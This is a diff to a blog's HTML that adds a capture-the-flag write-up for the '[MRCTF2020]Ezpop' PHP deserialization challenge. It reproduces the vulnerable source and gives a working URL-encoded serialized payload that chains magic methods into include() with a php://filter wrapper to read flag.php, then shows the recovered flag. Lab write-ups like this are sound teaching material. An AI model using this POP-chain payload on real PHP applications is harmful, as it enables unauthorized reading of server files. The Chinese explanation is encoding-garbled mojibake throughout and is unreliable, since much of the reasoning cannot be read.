@@ -69,6 +69,85 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-MRCTF2020-Ezpop" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/19/MRCTF2020-Ezpop/" class="article-date">
+  <time class="dt-published" datetime="2025-01-19T11:31:18.000Z" itemprop="datePublished">2025-01-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/19/MRCTF2020-Ezpop/">[MRCTF2020]Ezpop</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>���ȣ��򿪰л��������м��δ��롣<br>Welcome to index.php<br>&lt;?php<br>&#x2F;&#x2F;flag is in flag.php<br>&#x2F;&#x2F;WTF IS THIS?<br>&#x2F;&#x2F;Learn From <a target="_blank" rel="noopener" href="https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</a><br>&#x2F;&#x2F;And Crack It!<br>class Modifier {<br>    protected  $var;<br>    public function append($value){<br>        include($value);<br>    }<br>    public function __invoke(){<br>        $this-&gt;append($this-&gt;var);<br>    }<br>}</p>
+<p>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file&#x3D;’index.php’){<br>        $this-&gt;source &#x3D; $file;<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;<br>    }<br>    public function __toString(){<br>        return $this-&gt;str-&gt;source;<br>    }</p>
+<pre><code>public function __wakeup()&#123;
+    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+        echo &quot;hacker&quot;;
+        $this-&gt;source = &quot;index.php&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>}</p>
+<p>class Test{<br>    public $p;<br>    public function __construct(){<br>        $this-&gt;p &#x3D; array();<br>    }</p>
+<pre><code>public function __get($key)&#123;
+    $function = $this-&gt;p;
+    return $function();
+&#125;
+</code></pre>
+<p>}</p>
+<p>if(isset($_GET[‘pop’])){<br>    @unserialize($_GET[‘pop’]);<br>}<br>else{<br>    $a&#x3D;new Show;<br>    highlight_file(<strong>FILE</strong>);<br>}<br>������Ŀpop�ʹ������ݿ�֪���ǿ��鷴���л��ġ�</p>
+<p>�������֪flag������flag.php�С���������������Modifier��show��test�����˽�һЩ�����л���ħ������<br>__construct()&#x2F;&#x2F;��һ�����󴴽�ʱ������<br>__destruct() &#x2F;&#x2F;��һ����������ʱ������<br>__toString() &#x2F;&#x2F;��һ�����󱻵���һ���ַ���ʹ��<br>__sleep()&#x2F;&#x2F;�ڶ����ڱ����л�֮ǰ����<br>__wakeup()&#x2F;&#x2F;���ڷ����л�֮������������(ͨ�����л�����Ԫ�ظ����������ƹ�)<br>__get()&#x2F;&#x2F;���һ����ĳ�Ա����ʱ����<br>__set()&#x2F;&#x2F;����һ����ĳ�Ա����ʱ����<br>__invoke()&#x2F;&#x2F;���ú����ķ�ʽ����һ������ʱ�Ļ�Ӧ����<br>__call()&#x2F;&#x2F;������һ�������еĲ����õķ�����ʱ��ͻ�ִ���������<br>��Ҫ����һ��������֪ʶ��-&gt;��php�е��������<br>�ȷ�����һ�Ρ�<br>class Modifier {<br>    protected  $var;<br>    public function append($value){<br>        include($value);<br>    }<br>    public function __invoke(){<br>        $this-&gt;append($this-&gt;var);<br>    }<br>}</p>
+<p>��ħ������_invoke��������һ�������еĲ����õķ�����ʱ��ͻ�ִ��������������˴�Ӧ��phpαЭ��������flag.php��<br>$var&#x3D;”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php”<br>�ٿ��ڶ���<br>class Show{<br>    public $source;<br>    public $str;<br>    public function __construct($file&#x3D;’index.php’){<br>        $this-&gt;source &#x3D; $file;<br>        echo ‘Welcome to ‘.$this-&gt;source.”<br>“;<br>    }<br>    public function __toString(){<br>        return $this-&gt;str-&gt;source;<br>    }</p>
+<pre><code>public function __wakeup()&#123;
+    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+        echo &quot;hacker&quot;;
+        $this-&gt;source = &quot;index.php&quot;;
+    &#125;
+&#125;
+</code></pre>
+<p>}<br>����_toString()(��һ�����󱻵���һ���ַ���ʹ��),�ͺ�����_wakeup. ��$str��ֵΪ����Test����Test�в����ڳ�Ա����source������Դ���Test����ĳ�Ա����__get����$source��ֵΪ����Show�������ַ�����echo���ã�����toString��<br>��������<br>class Test{<br>    public $p;<br>    public function __construct(){<br>        $this-&gt;p &#x3D; array();<br>    }</p>
+<pre><code>public function __get($key)&#123;
+    $function = $this-&gt;p;
+    return $function();
+&#125;
+</code></pre>
+<p>}<br>��_get()(���һ����ĳ�Ա����ʱ����), ��$p��ֵΪ���󣬼�function��Ϊ����Modifierȴ�����ɺ������ã�����Modifier�е�invoke.<br>����˼·</p>
+<p>1.����include()��������Test���е�����p����Modifier����࣬�Ӷ�����__get()ħ������<br>��Modifier�������һ���������Ӷ�����__invoke()��������������include()����<br>2.��source ���ڶ��󣬽�������__toString������������ݡ�<br>����expΪ<br>���õ����л��������Ϊ<br>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BN%3B%7D%7D</p>
+<p>Ȼ����url�����봫�Σ���õ�һ�����룬�ŵ�SKR�н���õ�flag��<br><?php
+class Flag{
+    private $flag= "flag{9c3e90cd-e4b5-4230-887c-18efcfcaf3b4}";
+}
+echo "Help Me Find FLAG!";
+?></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/19/MRCTF2020-Ezpop/" data-id="cm63ko9ww0000awx1681aeccx" data-title="[MRCTF2020]Ezpop" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-web-反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
@@ -215,6 +294,10 @@ static class MyObject implements Serializable &#123;
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/01/19/MRCTF2020-Ezpop/">[MRCTF2020]Ezpop</a>
+          </li>
         
           <li>
             <a href="/2025/01/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">web 反序列化</a>
